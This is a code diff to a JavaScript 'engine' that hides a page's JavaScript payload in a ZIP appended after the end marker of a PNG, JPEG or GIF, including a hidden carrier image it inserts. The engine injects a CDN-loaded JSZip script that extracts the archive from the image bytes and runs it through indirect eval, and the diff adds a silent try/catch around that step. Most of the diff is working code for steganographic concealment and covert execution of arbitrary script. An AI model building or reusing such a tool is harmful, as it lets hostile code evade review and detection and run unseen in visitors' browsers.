@@ -71,8 +71,26 @@ function buildZipStore(name, data) {
 // ------------------------------------------------------------ CDN JSZip Loader
 const CLOUDFLARE_JSZIP_URL = 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
 
-function buildCloudflareZipScript(imgIndex = 0) {
-  return `<script src="${CLOUDFLARE_JSZIP_URL}" onload='(async()=>{function F(b){const v=new DataView(b.buffer,b.byteOffset,b.byteLength);let o=8;while(o+8<=b.length){const l=v.getUint32(o),t=String.fromCharCode(...b.slice(o+4,o+8));o+=8+l+4;if(t=="IEND")return o;}return -1;}const i=document.querySelectorAll("img")[${imgIndex}],s=i.src;let b;if(s.startsWith("data:")){b=Uint8Array.from(atob(s.split(",")[1]),c=>c.charCodeAt(0));}else{b=new Uint8Array(await(await fetch(s)).arrayBuffer());}const z=await JSZip.loadAsync(b.slice(F(b)));eval(await Object.values(z.files)[0].async("string"));})()'></script>`;
+const FINDERS = {
+  'image/png':
+    'const v=new DataView(b.buffer,b.byteOffset,b.byteLength);let o=8;' +
+    'while(o+12<=b.length){const l=v.getUint32(o),t=String.fromCharCode.apply(null,b.slice(o+4,o+8));' +
+    'o+=8+l+4;if(t=="IEND")return o;}return -1;',
+  'image/jpeg':
+    'let o=2;const v=new DataView(b.buffer,b.byteOffset,b.byteLength);' +
+    'while(o+2<=b.length){if(b[o]!=255)return -1;while(o+1<b.length&&b[o+1]==255)o++;if(o+2>b.length)return -1;' +
+    'const m=b[o+1];if(m==217)return o+2;if(m==0||m==1||(m>=208&&m<=215)){o+=2;continue;}' +
+    'if(o+4>b.length)return -1;const s=v.getUint16(o+2);if(s<2)return -1;o+=2+s;' +
+    'if(m==218){for(let i=o;i<b.length-1;i++)if(b[i]==255&&b[i+1]==217)return i+2;return -1;}}return -1;',
+  'image/gif':
+    'const v=new DataView(b.buffer,b.byteOffset,b.byteLength);let o=13;const p=b[10];if(p&128)o+=3*(1<<((p&7)+1));' +
+    'while(o<b.length){const k=b[o];if(k==59)return o+1;if(k==33){o+=2;while(o<b.length&&b[o])o+=b[o]+1;o++;}' +
+    'else if(k==44){if(o+9>=b.length)return -1;const l=b[o+9];o+=10;if(l&128)o+=3*(1<<((l&7)+1));o++;while(o<b.length&&b[o])o+=b[o]+1;o++;}else return -1;}return -1;',
+};
+
+function buildCloudflareZipScript(mime, imgIndex = 0) {
+  const finder = FINDERS[mime];
+  return `<script src="${CLOUDFLARE_JSZIP_URL}" onload='(async()=>{try{function F(b){${finder}}const imgs=document.querySelectorAll("img");const i=imgs[${imgIndex}]||imgs[0];if(!i)return;const s=i.src;let b;if(s.startsWith("data:")){b=Uint8Array.from(atob(s.split(",")[1]),c=>c.charCodeAt(0));}else{b=new Uint8Array(await(await fetch(s)).arrayBuffer());}const end=F(b);if(end<0)return;const z=await JSZip.loadAsync(b.slice(end));(0,eval)(await Object.values(z.files)[0].async("string"));}catch{}})()'></script>`;
 }
 
 export const engine = {
@@ -83,11 +101,13 @@ export const engine = {
     'It loads JSZip from Cloudflare CDN with an onload handler to unpack and run the payload.',
 
   async execute({ html, js }) {
+    if (!js || !js.trim()) throw new Error('JavaScript payload is empty.');
+
     let workingHtml = stripOriginalJs(html, js);
     let imgTags = findImgTags(workingHtml);
     if (!imgTags.length) {
       const carrierImg = '<img id="carrier-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAWUlEQVRYR+2WwQkAMAhD6790F3WCOkEFPxJ40EtJ85o5s11n9m6Bq/4tA3oG9Azov0Avw8m90DOgZ0DPgJ4BPQN6BvQM6BnQM6BnQM+AngE9A3oG9Az8nIEP2l73E2wMsqEAAAAASUVORK5CYII=" style="display:none;" />';
-      workingHtml = injectBeforeClose(workingHtml, carrierImg, { variation: true, allowBodyStart: true });
+      workingHtml = injectBeforeClose(workingHtml, carrierImg, { variation: false });
       imgTags = findImgTags(workingHtml);
     }
 
@@ -103,12 +123,9 @@ export const engine = {
 
     // Ensure the script is placed at the end of the file (before </body>, </html>, or EOF)
     // so all carrier images in the DOM have been fully parsed before JSZip executes its onload handler.
-    newHtml = injectBeforeClose(newHtml, buildCloudflareZipScript(index), {
+    newHtml = injectBeforeClose(newHtml, buildCloudflareZipScript(mime, index), {
       newline: true,
       variation: false,
-      allowBodyStart: false,
-      allowBodyMid: false,
-      placement: 'body-end',
     });
 
     const totalBytes = combined.length;
